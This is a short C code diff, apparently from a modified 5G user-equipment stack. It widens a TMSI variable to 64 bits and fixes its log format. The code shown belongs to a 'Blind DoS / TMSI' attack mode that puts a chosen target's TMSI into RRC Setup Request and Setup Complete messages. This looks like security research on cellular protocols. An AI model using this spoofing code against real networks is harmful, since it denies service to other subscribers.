@@ -781,9 +781,9 @@ int do_RRCSetupRequest(uint8_t *buffer, size_t buffer_size, uint8_t *rv)
   asn1cCalloc(c1->choice.rrcSetupRequest, rrcSetupRequest);
 
   if (tmsi_blind_dos_rrc /* != 0 */) {
-    int tmsi = tmsi_blind_dos_rrc << 1; // TMSI needs to be shifted because the TMSI buffer is 39 bits
+    uint64_t tmsi = tmsi_blind_dos_rrc << 1; // TMSI needs to be shifted because the TMSI buffer is 39 bits
     int buf_size = 5;
-    LOG_I(NR_RRC, "[Blind DoS / TMSI] RRC Setup Request, target TMSI: %d\n", tmsi);
+    LOG_I(NR_RRC, "[Blind DoS / TMSI] RRC Setup Request, target TMSI: %ld\n", tmsi);
     rrcSetupRequest->rrcSetupRequest.ue_Identity.present = NR_InitialUE_Identity_PR_ng_5G_S_TMSI_Part1;
     rrcSetupRequest->rrcSetupRequest.ue_Identity.choice.ng_5G_S_TMSI_Part1.size = buf_size;
     rrcSetupRequest->rrcSetupRequest.ue_Identity.choice.ng_5G_S_TMSI_Part1.bits_unused = 0;
@@ -918,8 +918,8 @@ uint8_t do_RRCSetupComplete(uint8_t *buffer,
   AssertFatal(stmsi->buf != NULL, "out of memory\n");
 
   if (tmsi_blind_dos_rrc /* != 0 */) {
-    int tmsi = tmsi_blind_dos_rrc;
-    LOG_I(NR_RRC, "[Blind DoS / TMSI] RRC Setup Complete, target TMSI: %d\n", tmsi);
+    uint64_t tmsi = tmsi_blind_dos_rrc;
+    LOG_I(NR_RRC, "[Blind DoS / TMSI] RRC Setup Complete, target TMSI: %ld\n", tmsi);
     stmsi->buf[0] = (tmsi & 0xff0000000000) >> 40;
     stmsi->buf[1] = (tmsi & 0x00ff00000000) >> 32;
     stmsi->buf[2] = (tmsi & 0x0000ff000000) >> 24;
